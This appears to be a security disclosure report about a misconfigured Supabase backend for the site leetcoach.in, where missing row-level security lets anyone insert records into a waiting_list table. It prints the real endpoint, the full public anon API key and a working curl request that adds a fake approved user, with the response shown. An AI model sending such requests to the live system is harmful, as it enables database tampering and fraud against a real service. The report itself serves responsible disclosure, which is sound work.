# 🛡️ Vulnerability Report: Unauthorized Data Insertion via Supabase API

### 📌 Title:  
**Insecure Supabase Configuration Allows Unauthorized Data Insertion into `waiting_list` Table**

---

### 🧠 Summary:
The Supabase backend used by `leetcoach.in` is misconfigured, allowing unauthenticated users to insert arbitrary data into the `waiting_list` table. This is due to exposed API keys with overly permissive access and the absence of proper authorization checks or row-level security (RLS).

---

### 🔍 Affected Asset:
- **API Endpoint:** `https://byteqaryxylhgalzwxpf.supabase.co/rest/v1/waiting_list`  
- **Frontend Domain:** `https://leetcoach.in`  
- **Database Table Affected:** `waiting_list`

---

### 💥 Vulnerability Type:
- Broken Access Control  
- Insecure Direct Object Reference (IDOR)  
- Excessive Permissions on `anon` API Key  
- Missing Authorization Checks  
- Potential GDPR/PII Violation

---

### ⚙️ Steps to Reproduce:

1. Use the public `anon` API key from the frontend JavaScript source or network traffic:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ5dGVxYXJ5eHlsaGdhbHp3eHBmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg3MDI5NzEsImV4cCI6MjA2NDI3ODk3MX0.pV4fizKt0g93bpoonB4HtZJ9pdWTHtDWmqPXfK078rM
2. Craft the following `curl` request:
```bash
curl -s -X POST \
  -H "apikey: <anon_api_key>" \
  -H "Authorization: Bearer <anon_api_key>" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{
    "email": "attacker@evil.com",
    "name": "H4ck3r",
    "status": "approved"
  }' \
  "https://byteqaryxylhgalzwxpf.supabase.co/rest/v1/waiting_list"
```
3. Observe a successful response:
```bash
[{
  "id": "uuid",
  "email": "attacker@evil.com",
  "name": "H4ck3r",
  "status": "approved",
  "joined_at": "...",
  "early_bird_discount": true
}]
```
---
### 📊 Impact:
1. Allows anyone to insert fake users into production databases.
2. Leads to data pollution, fraud, or privilege escalation.
3. May result in loss of trust or legal implications if sensitive data is involved.
4. No accountability since insertions are unauthenticated.
---
### 🔐 Recommended Remediation:
1. Enable Row-Level Security (RLS) on all tables.
2. Restrict anon role permissions to SELECT or use RPC-only models.
3. Move inserts behind serverless functions with authentication validation.
4. Rotate compromised API keys immediately.
5. Audit Supabase policies for other insecure configurations.
---


